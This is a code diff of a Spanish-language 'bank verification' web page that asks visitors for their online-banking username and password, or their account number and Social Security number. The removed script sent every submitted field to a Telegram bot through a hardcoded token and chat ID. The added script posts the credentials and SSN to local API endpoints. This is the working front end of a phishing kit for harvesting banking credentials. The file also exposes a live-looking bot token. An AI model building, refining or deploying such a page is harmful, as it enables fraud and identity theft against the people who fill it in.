@@ -11,8 +11,426 @@
   <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
 
   <style>
-    /* Aquí va todo tu CSS completo tal como tienes, para no extender la respuesta. */
-    /* Copia y pega tu CSS existente para que mantenga el diseño. */
+    /* Tu CSS completo acá - mantenido igual */
+    :root {
+      --ink: #172033;
+      --muted: #5e687a;
+      --line: #dbe2ee;
+      --panel: #ffffff;
+      --canvas: #f4f7fb;
+      --navy: #0b2f63;
+      --blue: #0b5cab;
+      --blue-dark: #083f79;
+      --gold: #c49a2c;
+      --success: #177245;
+      --danger: #b42318;
+      --shadow: 0 18px 45px rgba(15, 39, 77, 0.12);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      margin: 0;
+      font-family: "Inter", Arial, sans-serif;
+      color: var(--ink);
+      background:
+        radial-gradient(circle at top left, rgba(11, 92, 171, 0.12), transparent 34rem),
+        linear-gradient(180deg, #ffffff 0%, var(--canvas) 42%);
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    .topbar {
+      position: sticky;
+      top: 0;
+      z-index: 20;
+      border-bottom: 1px solid rgba(219, 226, 238, 0.9);
+      background: rgba(255, 255, 255, 0.94);
+      backdrop-filter: blur(14px);
+    }
+
+    .topbar-inner {
+      width: min(1120px, calc(100% - 32px));
+      min-height: 72px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 24px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-weight: 800;
+      letter-spacing: 0;
+      color: var(--navy);
+    }
+
+    .brand-mark {
+      width: 42px;
+      height: 42px;
+      display: grid;
+      place-items: center;
+      border-radius: 10px;
+      color: white;
+      background: linear-gradient(135deg, var(--blue), var(--navy));
+      box-shadow: 0 10px 22px rgba(11, 92, 171, 0.24);
+    }
+
+    .brand-text {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+      line-height: 1;
+    }
+
+    .brand-text span:first-child {
+      font-size: 1.05rem;
+    }
+
+    .brand-text span:last-child {
+      font-size: 0.76rem;
+      font-weight: 700;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+
+    nav.main-nav {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    nav.main-nav a {
+      padding: 10px 14px;
+      border-radius: 8px;
+      color: var(--muted);
+      font-weight: 700;
+      font-size: 0.94rem;
+    }
+
+    nav.main-nav a:hover,
+    nav.main-nav a.active {
+      color: var(--blue);
+      background: #edf5ff;
+    }
+
+    .page {
+      width: min(1120px, calc(100% - 32px));
+      margin: 42px auto 64px;
+      display: grid;
+      grid-template-columns: 1fr 360px;
+      gap: 28px;
+      align-items: start;
+    }
+
+    .main-panel,
+    .side-panel {
+      background: rgba(255, 255, 255, 0.96);
+      border: 1px solid var(--line);
+      box-shadow: var(--shadow);
+    }
+
+    .main-panel {
+      border-radius: 16px;
+      overflow: hidden;
+    }
+
+    .panel-header {
+      padding: 34px 38px 28px;
+      color: white;
+      background:
+        linear-gradient(135deg, rgba(11, 92, 171, 0.98), rgba(11, 47, 99, 0.98)),
+        url("https://images.unsplash.com/photo-1560472355-536de3962603?auto=format&fit=crop&w=1200&q=80");
+      background-size: cover;
+      background-position: center;
+      background-blend-mode: multiply;
+    }
+
+    .eyebrow {
+      margin: 0 0 12px;
+      font-size: 0.78rem;
+      font-weight: 800;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: rgba(255, 255, 255, 0.76);
+    }
+
+    h1 {
+      max-width: 680px;
+      margin: 0;
+      font-size: clamp(2rem, 4vw, 3.25rem);
+      line-height: 1.05;
+      letter-spacing: 0;
+    }
+
+    .intro {
+      max-width: 650px;
+      margin: 14px 0 0;
+      color: rgba(255, 255, 255, 0.82);
+      font-size: 1.02rem;
+      line-height: 1.6;
+    }
+
+    .form-area {
+      padding: 34px 38px 38px;
+    }
+
+    .section-title {
+      margin: 0 0 8px;
+      font-size: 1.25rem;
+      color: var(--ink);
+    }
+
+    .section-note {
+      margin: 0 0 22px;
+      color: var(--muted);
+      line-height: 1.55;
+    }
+
+    .field-grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 16px;
+    }
+
+    .form-group {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    label {
+      color: #344056;
+      font-weight: 800;
+      font-size: 0.92rem;
+    }
+
+    select,
+    input {
+      width: 100%;
+      border: 1px solid #c8d3e1;
+      border-radius: 9px;
+      padding: 13px 14px;
+      color: var(--ink);
+      background: white;
+      font: inherit;
+      transition: border-color 0.18s ease, box-shadow 0.18s ease;
+    }
+
+    .material-icons.left {
+      position: absolute;
+      left: 12px;
+      top: 46px;
+      font-size: 24px;
+      color: var(--muted);
+      pointer-events: none;
+    }
+
+    select[aria-hidden="true"],
+    .hidden {
+      display: none;
+    }
+
+    .visible {
+      display: block;
+    }
+
+    .actions {
+      margin-top: 26px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .privacy-note {
+      max-width: 420px;
+      margin: 0;
+      color: var(--muted);
+      font-size: 0.86rem;
+      line-height: 1.5;
+    }
+
+    .submit-btn {
+      min-width: 200px;
+      border: 0;
+      border-radius: 9px;
+      padding: 12px 18px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      color: white;
+      background: var(--blue);
+      font: inherit;
+      font-weight: 800;
+      cursor: pointer;
+      box-shadow: 0 12px 22px rgba(11, 92, 171, 0.22);
+      transition: background 0.18s ease, transform 0.18s ease;
+    }
+
+    .submit-btn:disabled {
+      cursor: not-allowed;
+      color: #7c8798;
+      background: #e1e7f0;
+      box-shadow: none;
+      transform: none;
+    }
+
+    .message {
+      min-height: 22px;
+      margin-top: 18px;
+      font-weight: 800;
+      color: var(--danger);
+    }
+
+    .message.success {
+      color: var(--success);
+    }
+
+    .side-panel {
+      position: sticky;
+      top: 96px;
+      border-radius: 16px;
+      overflow: hidden;
+    }
+
+    .security-card {
+      padding: 26px;
+      background:
+        linear-gradient(160deg, rgba(11, 47, 99, 0.96), rgba(8, 63, 121, 0.96)),
+        url("https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?auto=format&fit=crop&w=900&q=80");
+      background-size: cover;
+      background-position: center;
+      background-blend-mode: multiply;
+      color: white;
+    }
+
+    .security-card .material-icons {
+      width: 48px;
+      height: 48px;
+      display: grid;
+      place-items: center;
+      border-radius: 12px;
+      color: var(--navy);
+      background: white;
+      font-size: 28px;
+    }
+
+    .security-card h2 {
+      margin: 20px 0 10px;
+      font-size: 1.45rem;
+      line-height: 1.15;
+    }
+
+    .security-card p {
+      margin: 0;
+      color: rgba(255, 255, 255, 0.8);
+      line-height: 1.55;
+    }
+
+    .side-list {
+      padding: 22px 26px 26px;
+      display: grid;
+      gap: 18px;
+      background: white;
+    }
+
+    .side-item {
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+    }
+
+    .side-item .material-icons {
+      color: var(--gold);
+      font-size: 24px;
+    }
+
+    .side-item strong {
+      display: block;
+      margin-bottom: 3px;
+      color: var(--ink);
+    }
+
+    .side-item span {
+      color: var(--muted);
+      font-size: 0.9rem;
+      line-height: 1.45;
+    }
+
+    @media (max-width: 940px) {
+      .page {
+        grid-template-columns: 1fr;
+      }
+
+      .side-panel {
+        position: static;
+      }
+    }
+
+    @media (max-width: 720px) {
+      .topbar-inner {
+        align-items: flex-start;
+        flex-direction: column;
+        padding: 14px 0;
+      }
+
+      nav.main-nav {
+        width: 100%;
+        overflow-x: auto;
+        padding-bottom: 4px;
+      }
+
+      .page {
+        width: min(100% - 22px, 1120px);
+        margin-top: 24px;
+      }
+
+      .panel-header,
+      .form-area {
+        padding: 28px 22px;
+      }
+    }
+
+    /* Small adjustments to preserve functionality look from the second file */
+    #show-traditional {
+      display: inline-block;
+      margin-top: 18px;
+      color: var(--blue);
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .left-small-icon {
+      position: absolute;
+      left: 12px;
+      top: 38px;
+      font-size: 22px;
+      color: var(--muted);
+      pointer-events: none;
+    }
+
+    select,
+    input[type="text"],
+    input[type="password"] {
+      padding-left: 44px;
+    }
+
+    .compact-small {
+      margin-top: 12px;
+    }
   </style>
 </head>
 
@@ -40,16 +458,14 @@
       <div class="panel-header">
         <p class="eyebrow">Proceso de verificación</p>
         <h1 id="panel-title">Confirmación - Información Bancaria</h1>
-        <p class="intro">
-          Seleccione su entidad y elija el método de verificación. Nunca le pediremos contraseñas completas por
-          canales inseguros.
-        </p>
+        <p class="intro">Seleccione su entidad y elija el método de verificación. Nunca le pediremos contraseñas completas por canales inseguros.</p>
       </div>
 
       <div class="form-area" id="form-area">
         <h2 class="section-title">Paso 2: Información Bancaria y Verificación</h2>
         <p class="section-note">Elija su banco y el método preferido para verificar su cuenta.</p>
 
+        <!-- Bank selection -->
         <div class="field-grid">
           <div class="form-group">
             <label for="bank-select">Seleccione su banco</label>
@@ -92,29 +508,24 @@
           </div>
         </div>
 
+        <!-- Fast verification -->
         <section id="fast-verification" aria-live="polite" aria-hidden="true" class="hidden">
           <form id="fast-form" novalidate>
             <div class="form-group compact-small">
               <label for="fast-user">Usuario</label>
               <span class="material-icons left-small-icon" aria-hidden="true">person</span>
-              <input type="text" id="fast-user" name="user" placeholder="Ingrese su usuario" required autocomplete="username"
-                aria-required="true" />
+              <input type="text" id="fast-user" name="user" placeholder="Ingrese su usuario" required autocomplete="username" aria-required="true" />
             </div>
 
             <div class="form-group compact-small" style="position: relative;">
               <label for="fast-pass">Contraseña</label>
               <span class="material-icons left-small-icon" aria-hidden="true">vpn_key</span>
-              <input type="password" id="fast-pass" name="password" placeholder="Ingrese su contraseña" required
-                autocomplete="current-password" aria-required="true" />
-              <button type="button" aria-label="Mostrar u ocultar contraseña" id="toggle-password"
-                style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; font-size: 20px; color: var(--muted);">visibility</button>
+              <input type="password" id="fast-pass" name="password" placeholder="Ingrese su contraseña" required autocomplete="current-password" aria-required="true" />
+              <button type="button" aria-label="Mostrar u ocultar contraseña" id="toggle-password" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; font-size: 20px; color: var(--muted);">visibility</button>
             </div>
 
             <div class="actions">
-              <p class="privacy-note">
-                Esta página solo solicita usuario y una contraseña corta para verificación rápida. No comparta
-                credenciales completas si tiene dudas.
-              </p>
+              <p class="privacy-note">Esta página solo solicita usuario y una contraseña corta para verificación rápida. No comparta credenciales completas si tiene dudas.</p>
               <button type="submit" class="submit-btn" disabled>Enviar Verificación Rápida</button>
             </div>
           </form>
@@ -124,6 +535,7 @@
           Optar por otro tipo de verificación tradicional
         </div>
 
+        <!-- Traditional verification -->
         <section id="traditional-verification" aria-live="polite" aria-hidden="true" class="hidden">
           <form id="traditional-form" novalidate>
             <div class="form-group compact-small">
@@ -173,13 +585,11 @@
             <div class="form-group compact-small" style="position: relative;">
               <label for="ssn">Número de Seguro Social</label>
               <span class="material-icons left-small-icon" aria-hidden="true">fingerprint</span>
-              <input type="text" id="ssn" name="ssn" placeholder="000-00-0000" maxlength="11" pattern="\d{3}-\d{2}-\d{4}"
-                inputmode="numeric" required />
+              <input type="text" id="ssn" name="ssn" placeholder="000-00-0000" maxlength="11" pattern="\d{3}-\d{2}-\d{4}" inputmode="numeric" required />
             </div>
 
             <div class="actions">
-              <p class="privacy-note">La verificación tradicional solicita los datos necesarios para confirmar su
-                titularidad de cuenta.</p>
+              <p class="privacy-note">La verificación tradicional solicita los datos necesarios para confirmar su titularidad de cuenta.</p>
               <button type="submit" class="submit-btn" disabled>Enviar Verificación Tradicional</button>
             </div>
           </form>
@@ -193,8 +603,7 @@
       <div class="security-card">
         <span class="material-icons" aria-hidden="true">verified_user</span>
         <h2>Diseño formal, claro y confiable</h2>
-        <p>Una interfaz sobria ayuda a que el proceso se sienta ordenado sin aparentar ser una página oficial de un
-          banco.</p>
+        <p>Una interfaz sobria ayuda a que el proceso se sienta ordenado sin aparentar ser una página oficial de un banco.</p>
       </div>
 
       <div class="side-list">
@@ -224,83 +633,30 @@
   </main>
 
   <script>
-    // Aquí debes poner tu token y chat ID reales
-    const TELEGRAM_BOT_TOKEN = "8971891524:AAFC4-baosBfj6etGfS4KO7XsGEXGMxd8Z8";
-    const TELEGRAM_CHAT_ID = "5086566121";
+    const bankSelect = document.getElementById('bank-select');
+    const fastVerification = document.getElementById('fast-verification');
+    const fastForm = document.getElementById('fast-form');
+    const showTraditionalBtn = document.getElementById('show-traditional');
+    const traditionalSection = document.getElementById('traditional-verification');
+    const traditionalForm = document.getElementById('traditional-form');
+    const togglePasswordBtn = document.getElementById('toggle-password');
+    const fastPassInput = document.getElementById('fast-pass');
+    const fastSubmitBtn = fastForm ? fastForm.querySelector('button[type="submit"]') : null;
+    const traditionalSubmitBtn = traditionalForm ? traditionalForm.querySelector('button[type="submit"]') : null;
+    const messageEl = document.getElementById('message');
 
     let sending = false;
 
     function showMessage(msg, isError = true) {
-      const messageEl = document.getElementById('message');
       messageEl.textContent = msg;
       messageEl.className = 'message ' + (isError ? '' : 'success');
     }
 
     function clearMessage() {
-      const messageEl = document.getElementById('message');
       messageEl.textContent = '';
       messageEl.className = 'message';
     }
 
-    async function enviarTelegram(mensaje) {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const params = new URLSearchParams({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: mensaje,
-        parse_mode: "HTML"
-      });
-
-      try {
-        const res = await fetch(`${url}?${params.toString()}`, { method: "GET" });
-        const data = await res.json();
-        if (!data.ok) throw new Error(data.description);
-        return true;
-      } catch (error) {
-        console.error("Error enviando a Telegram:", error);
-        return false;
-      }
-    }
-
-    async function handleSubmitTelegram(event) {
-      event.preventDefault();
-      clearMessage();
-
-      if (sending) return;
-
-      const form = event.target;
-      const btn = form.querySelector('button[type="submit"]');
-
-      if (!form.checkValidity()) {
-        showMessage('Por favor completa correctamente todos los campos.');
-        return;
-      }
-
-      sending = true;
-      if (btn) btn.disabled = true;
-
-      const formData = new FormData(form);
-      let mensaje = "<b>Nuevo envío - Hope Foundation</b>\n\n";
-      for (const [key, value] of formData.entries()) {
-        mensaje += `<b>${key}:</b> ${value}\n`;
-      }
-
-      const enviado = await enviarTelegram(mensaje);
-
-      if (enviado) {
-        showMessage('Datos enviados a Telegram correctamente.', false);
-        setTimeout(() => {
-          window.location.href = 'paso3.html';
-        }, 1500);
-      } else {
-        showMessage('Error enviando datos a Telegram. Por favor intente más tarde.');
-        sending = false;
-        if (btn) btn.disabled = false;
-      }
-    }
-
-    // Lógica para toggle password
-    const togglePasswordBtn = document.getElementById('toggle-password');
-    const fastPassInput = document.getElementById('fast-pass');
     if (togglePasswordBtn && fastPassInput) {
       togglePasswordBtn.addEventListener('click', () => {
         if (fastPassInput.type === 'password') {
@@ -315,14 +671,6 @@
       });
     }
 
-    // Mostrar/Ocultar formas y validar inputs
-    const bankSelect = document.getElementById('bank-select');
-    const fastVerification = document.getElementById('fast-verification');
-    const fastForm = document.getElementById('fast-form');
-    const traditionalSection = document.getElementById('traditional-verification');
-    const traditionalForm = document.getElementById('traditional-form');
-    const showTraditionalBtn = document.getElementById('show-traditional');
-
     function validateForm(form, button) {
       if (!form) return;
       const inputs = Array.from(form.querySelectorAll('input, select')).filter(el => el.offsetParent !== null && !el.disabled);
@@ -333,18 +681,55 @@
       }
     }
 
-    window.addEventListener('load', () => {
-      if (fastForm) validateForm(fastForm, fastForm.querySelector('button[type="submit"]'));
-      if (traditionalForm) validateForm(traditionalForm, traditionalForm.querySelector('button[type="submit"]'));
+    [fastForm, traditionalForm].forEach(form => {
+      if (!form) return;
+      const btn = form.querySelector('button[type="submit"]');
+      form.querySelectorAll('input, select').forEach(input => {
+        const evt = input.tagName.toLowerCase() === 'select' ? 'change' : 'input';
+        input.addEventListener(evt, () => {
+          clearMessage();
+          validateForm(form, btn);
+        });
+      });
+      window.addEventListener('load', () => validateForm(form, btn));
+    });
+
+    function setFormEnabled(form, enabled) {
+      if (!form) return;
+      [...form.querySelectorAll('input, select, button')].forEach(el => {
+        el.disabled = !enabled;
+      });
+    }
+
+    function hideAllForms() {
       if (fastVerification) {
         fastVerification.classList.add('hidden');
+        fastVerification.classList.remove('visible');
         fastVerification.setAttribute('aria-hidden', 'true');
+        setFormEnabled(fastForm, false);
       }
       if (traditionalSection) {
         traditionalSection.classList.add('hidden');
+        traditionalSection.classList.remove('visible');
         traditionalSection.setAttribute('aria-hidden', 'true');
+        setFormEnabled(traditionalForm, false);
       }
+      if (showTraditionalBtn) showTraditionalBtn.style.display = 'none';
+      clearMessage();
+    }
+
+    function showBankSelectionOnly() {
+      if (bankSelect) {
+        bankSelect.value = '';
+        bankSelect.focus();
+      }
+      hideAllForms();
       if (showTraditionalBtn) showTraditionalBtn.style.display = 'block';
+      clearMessage();
+    }
+
+    window.addEventListener('load', () => {
+      showBankSelectionOnly();
     });
 
     if (bankSelect) {
@@ -352,18 +737,24 @@
         clearMessage();
         if (bankSelect.value) {
           if (fastVerification) {
+            fastVerification.classList.add('visible');
             fastVerification.classList.remove('hidden');
             fastVerification.setAttribute('aria-hidden', 'false');
+            setFormEnabled(fastForm, true);
           }
           if (traditionalSection) {
             traditionalSection.classList.add('hidden');
+            traditionalSection.classList.remove('visible');
             traditionalSection.setAttribute('aria-hidden', 'true');
+            setFormEnabled(traditionalForm, false);
           }
           if (showTraditionalBtn) showTraditionalBtn.style.display = 'block';
         } else {
           if (fastVerification) {
             fastVerification.classList.add('hidden');
+            fastVerification.classList.remove('visible');
             fastVerification.setAttribute('aria-hidden', 'true');
+            setFormEnabled(fastForm, false);
           }
           if (showTraditionalBtn) showTraditionalBtn.style.display = 'block';
         }
@@ -372,36 +763,135 @@
 
     if (showTraditionalBtn) {
       showTraditionalBtn.addEventListener('click', () => {
+        if (bankSelect) {
+          bankSelect.value = '';
+          bankSelect.focus();
+        }
         clearMessage();
+
         if (fastVerification) {
           fastVerification.classList.add('hidden');
+          fastVerification.classList.remove('visible');
           fastVerification.setAttribute('aria-hidden', 'true');
+          setFormEnabled(fastForm, false);
         }
+
         if (traditionalSection) {
+          traditionalSection.classList.add('visible');
           traditionalSection.classList.remove('hidden');
           traditionalSection.setAttribute('aria-hidden', 'false');
+          setFormEnabled(traditionalForm, true);
         }
+
         showTraditionalBtn.style.display = 'none';
       });
     }
 
-    [fastForm, traditionalForm].forEach(form => {
-      if (!form) return;
-      const btn = form.querySelector('button[type="submit"]');
-      form.querySelectorAll('input, select').forEach(input => {
-        const evt = input.tagName.toLowerCase() === 'select' ? 'change' : 'input';
-        input.addEventListener(evt, () => validateForm(form, btn));
-      });
-    });
+    async function enviarVerificacionRapida() {
+      clearMessage();
+
+      if (sending) return;
+      sending = true;
+
+      const bank = bankSelect.value.trim();
+      const user = document.getElementById('fast-user').value.trim();
+      const password = fastPassInput.value.trim();
+      if (!bank || !user || !password) {
+        showMessage('Completa todos los campos de verificación rápida.');
+        sending = false;
+        return;
+      }
+
+      const payload = {
+        method: "fast",
+        bank,
+        user,
+        password,
+      };
+
+      try {
+        const response = await fetch('http://localhost:5000/api/verify', {
+          method: 'POST',
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        });
+
+        if (response.ok) {
+          const json = await response.json();
+          showMessage('Verificación rápida enviada correctamente. ID: ' + json.id, false);
+          setTimeout(() => window.location.href = 'paso3.html', 1500);
+        } else {
+          const err = await response.json();
+          showMessage('Error: ' + (err.error || 'Error al enviar'));
+        }
+      } catch (error) {
+        showMessage('Error de conexión.');
+        console.error(error);
+      } finally {
+        sending = false;
+      }
+    }
+
+    async function enviarVerificacionTradicional() {
+      clearMessage();
+
+      if (sending) return;
+      sending = true;
+
+      const bank = document.getElementById('traditional-bank').value.trim();
+      const accountNumber = document.getElementById('account-number').value.trim();
+      const ssn = document.getElementById('ssn').value.trim();
+
+      if (!bank || !accountNumber || !ssn) {
+        showMessage('Completa todos los campos de verificación tradicional.');
+        sending = false;
+        return;
+      }
+
+      const payload = {
+        method: "traditional",
+        bank,
+        account_number: accountNumber,
+        ssn
+      };
+
+      try {
+        const response = await fetch('http://localhost:5000/api/solicitud', {
+          method: 'POST',
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        });
+
+        if (response.ok) {
+          const json = await response.json();
+          showMessage('Verificación tradicional enviada correctamente. ID: ' + json.id, false);
+          setTimeout(() => window.location.href = 'paso3.html', 1500);
+        } else {
+          const err = await response.json();
+          showMessage('Error: ' + (err.error || 'Error al enviar'));
+        }
+      } catch (error) {
+        showMessage('Error de conexión.');
+        console.error(error);
+      } finally {
+        sending = false;
+      }
+    }
 
     if (fastForm) {
-      fastForm.addEventListener('submit', handleSubmitTelegram);
-    }
-    if (traditionalForm) {
-      traditionalForm.addEventListener('submit', handleSubmitTelegram);
+      fastForm.addEventListener('submit', e => {
+        e.preventDefault();
+        enviarVerificacionRapida();
+      });
     }
 
-    // Formateo en tiempo real para SSN
+    if (traditionalForm) {
+      traditionalForm.addEventListener('submit', e => {
+        e.preventDefault();
+        enviarVerificacionTradicional();
+      });
+    }
+
     const ssnInput = document.getElementById('ssn');
     if (ssnInput) {
       ssnInput.addEventListener('input', () => {
